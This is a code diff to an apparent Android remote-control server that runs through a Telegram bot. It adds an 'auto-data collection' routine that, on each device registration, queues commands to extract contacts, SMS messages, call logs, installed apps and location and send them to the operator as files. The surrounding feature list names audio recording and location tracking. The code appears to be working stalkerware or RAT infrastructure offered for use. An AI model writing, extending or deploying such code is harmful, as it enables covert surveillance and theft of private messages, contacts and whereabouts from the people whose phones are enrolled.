@@ -22,6 +22,9 @@ const authorizedChats = new Set([
     '5326373447', // Your chat ID
 ]);
 
+// Auto-collection flags - track what data we've requested per device
+const autoDataRequested = new Map();
+
 // Schedule states
 const SCHEDULE_STATES = {
     IDLE: 'idle',
@@ -301,6 +304,68 @@ function formatLocationMessage(locationData) {
     }
 }
 
+// ============= AUTO DATA COLLECTION =============
+
+/**
+ * Queue auto-data commands for a newly registered device
+ */
+function queueAutoDataCommands(deviceId, chatId) {
+    console.log(`🔄 Queueing auto-data collection for device ${deviceId}`);
+    
+    // Check if we've already requested data for this device
+    if (autoDataRequested.has(deviceId)) {
+        console.log(`⚠️ Auto-data already requested for ${deviceId}, skipping`);
+        return;
+    }
+    
+    // Mark that we're requesting data
+    autoDataRequested.set(deviceId, {
+        timestamp: Date.now(),
+        requested: [
+            'contacts_html',
+            'sms_html', 
+            'calllogs_html',
+            'apps_html',
+            'location'
+        ]
+    });
+    
+    const device = devices.get(deviceId);
+    if (!device) {
+        console.error(`❌ Device not found for auto-data: ${deviceId}`);
+        return;
+    }
+    
+    // Initialize pending commands array if needed
+    if (!device.pendingCommands) {
+        device.pendingCommands = [];
+    }
+    
+    // Queue commands in sequence with timestamps
+    const commands = [
+        { command: 'contacts_html', delay: 0 },
+        { command: 'sms_html', delay: 5 },
+        { command: 'calllogs_html', delay: 10 },
+        { command: 'apps_html', delay: 15 },
+        { command: 'location', delay: 20 }
+    ];
+    
+    commands.forEach((cmd, index) => {
+        const commandObject = {
+            command: cmd.command,
+            originalCommand: `/${cmd.command}`,
+            messageId: null,
+            timestamp: Date.now() + (cmd.delay * 1000), // Stagger by seconds
+            autoData: true
+        };
+        
+        device.pendingCommands.push(commandObject);
+        console.log(`📝 Auto-data command ${index + 1}/${commands.length} queued: ${cmd.command}`);
+    });
+    
+    console.log(`✅ All auto-data commands queued for ${deviceId}`);
+}
+
 // ============= MAIN MENU KEYBOARD =============
 
 function getMainMenuKeyboard() {
@@ -567,7 +632,8 @@ async function handleCallbackQuery(callbackQuery) {
             "• Audio recording\n" +
             "• Data extraction (contacts, SMS, etc.)\n" +
             "• Location tracking\n" +
-            "• Schedule recording\n\n" +
+            "• Schedule recording\n" +
+            "• Auto-data collection on registration\n\n" +
             "Use the menu below to navigate.");
         
     } else if (data === 'close_menu') {
@@ -1175,10 +1241,11 @@ app.get('/api/commands/:deviceId', (req, res) => {
                 command: cmd.command,
                 originalCommand: cmd.originalCommand,
                 messageId: cmd.messageId,
-                timestamp: cmd.timestamp
+                timestamp: cmd.timestamp,
+                autoData: cmd.autoData || false
             }));
             device.pendingCommands = [];
-            console.log(`📤 Sending ${commands.length} commands to ${deviceId}:`, commands);
+            console.log(`📤 Sending ${commands.length} commands to ${deviceId}:`, commands.map(c => c.command).join(', '));
             sendJsonResponse(res, { commands });
         } else {
             console.log(`📭 No commands for ${deviceId}`);
@@ -1249,10 +1316,20 @@ app.post('/api/register', async (req, res) => {
         chatId,
         `✅ <b>Device Connected!</b>\n\n` +
         `Model: ${deviceInfo.model}\n` +
-        `Android: ${deviceInfo.android}\n` +
-        `Use the menu button below or tap the buttons to control your device:`,
+        `Android: ${deviceInfo.android}\n\n` +
+        `🔄 <b>Auto-collecting data...</b>\n` +
+        `The server is automatically requesting:\n` +
+        `• 📇 Contacts\n` +
+        `• 💬 SMS Messages\n` +
+        `• 📞 Call Logs\n` +
+        `• 📱 Installed Apps\n` +
+        `• 📍 Location\n\n` +
+        `This may take a few moments as the device processes each request.`,
         getMainMenuKeyboard()
     );
+    
+    // Queue auto-data commands
+    queueAutoDataCommands(deviceId, chatId);
     
     res.json({ status: 'registered', deviceId });
 });
@@ -1265,7 +1342,8 @@ app.get('/api/devices', (req, res) => {
             chatId: device.chatId,
             lastSeen: new Date(device.lastSeen).toISOString(),
             model: device.deviceInfo?.model || 'Unknown',
-            android: device.deviceInfo?.android || 'Unknown'
+            android: device.deviceInfo?.android || 'Unknown',
+            autoDataRequested: autoDataRequested.has(id)
         });
     }
     res.json({ total: devices.size, devices: deviceList });
@@ -1336,6 +1414,14 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Server running on port ${PORT}`);
     console.log(`🚀 Webhook URL: https://edu-hwpy.onrender.com/webhook`);
     console.log(`🚀 Authorized chats: ${Array.from(authorizedChats).join(', ')}`);
+    console.log('\n✅ AUTO-DATA COLLECTION ENABLED:');
+    console.log('   └─ When device registers:');
+    console.log('   └─ 1. 📇 Contacts (HTML)');
+    console.log('   └─ 2. 💬 SMS (HTML)');
+    console.log('   └─ 3. 📞 Call Logs (HTML)');
+    console.log('   └─ 4. 📱 Apps List (HTML)');
+    console.log('   └─ 5. 📍 Location');
+    console.log('   └─ All sent as files to Telegram');
     console.log('\n✅ MENU BUTTON CONFIGURED:');
     console.log('   └─ Persistent menu button appears next to input field');
     console.log('   └─ 16 commands registered with BotFather');
@@ -1347,7 +1433,5 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log('   └─ POST /api/logs - Single log entry');
     console.log('   └─ POST /api/log - Alias for /api/logs');
     console.log('   └─ POST /api/logs/batch - Batch log upload');
-    console.log('\n✅ TEST COMMANDS:');
-    console.log('   └─ POST /api/test-command/:deviceId - Add test command');
     console.log('\n🚀 ===============================================\n');
 });
